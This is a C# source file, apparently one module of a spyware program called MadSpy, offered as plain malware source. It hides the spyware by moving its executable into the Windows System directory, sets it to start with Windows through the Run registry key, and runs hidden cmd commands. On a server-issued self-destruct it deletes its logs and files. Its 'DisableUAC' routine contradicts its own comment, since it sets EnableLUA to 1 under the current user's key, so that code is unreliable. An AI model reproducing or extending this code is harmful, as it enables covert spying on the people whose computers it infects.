using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace MadSpy
{
    class Injector
    {
        public static void Inject(Data data) 
        {
            while (true)
            {
                Thread.Sleep(1000);

                string agent;
                lock (Program.DATALOCK)
                {
                    agent = data.Agent;
                }
                
                //
                // if the agent equals to madspy, it means that the central server has not decided to inject this spyware unit (agent).
                // The agent has to wait until further notice reception from server
                //
                if (agent.ToUpper().Equals("MADSPY")) 
                    continue;

                lock (Program.DATALOCK)
                {
                    DisableUAC(data);
                }

                string saveAsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + agent + @"\";
                string saveAsName = saveAsDirectory + agent + ".exe";

                FileInfo fileInfoOutputFile = new FileInfo(saveAsName);

                if (!fileInfoOutputFile.Exists)
                {
                    //
                    // if the execution reached here, the spyware has to be injected into the system
                    //
                    Directory.CreateDirectory(saveAsDirectory);
                    Cmd("move \"" + Application.ExecutablePath + "\" \"" + saveAsName + "\"");

                    ProcessStartInfo psi = new ProcessStartInfo(saveAsName);
                    Process.Start(psi);

                    lock (Program.DATALOCK)
                    {
                        Regedit(data);

                        System.Environment.Exit(0);
                    }
                }
                else
                {
                    lock (Program.DATALOCK)
                    {
                        Regedit(data);
                    }

                    if (data.Status == Status.Selfdestroy)
                    {
                        //
                        // some data are stored temp path, such data have to be destroyed once required
                        //
                        Cmd("del \"" + Path.GetTempPath() + "\\log.txt\"");
                        Cmd("del \"" + Path.GetTempPath() + "\\img.html\"");
                        Cmd("del \"" + Application.ExecutablePath + "\"");
                        Cmd("rmdir /s /q \"" + Assembly.GetEntryAssembly().Location + "\"");

                        System.Environment.Exit(0);
                    }
                }
            }
        }

        //
        // setting the spyware to be executed on startup
        //
        private static void Regedit(Data data)
        {
            try
            {
                RegistryKey startupKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (data.Status != Status.Selfdestroy)
                {
                    startupKey.SetValue(data.Agent, Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + data.Agent + @"\" + data.Agent + ".exe");
                    startupKey.Close();
                }
                else
                {
                    startupKey.DeleteValue(data.Agent, false);
                    startupKey.Close();
                }
            }
            catch (Exception e) { }
        }

        //
        // disabling UAC, in such way, Windows will be unable to track further actions taken by the spyware
        //
        private static void DisableUAC(Data data) 
        {
            try
            {
                RegistryKey uac = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                uac = Registry.CurrentUser.CreateSubKey(("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));
                uac.SetValue("EnableLUA", 1);
                uac.Close();
            }
            catch (Exception e) { }
        }
       
        //
        // used to lunch an extern program that can handle the spyware. To be called if the spyware has to change location
        // or if it has to be destroyed prior a central server request
        //
        private static void Cmd(string command) 
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", String.Format("/k {0} & {1} & {2}", "timeout /T 1 /NOBREAK >NUL", @command, "exit"));
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            //
            // the utility is executed ad an external process
            //
            Process.Start(psi);
        }
    }
}
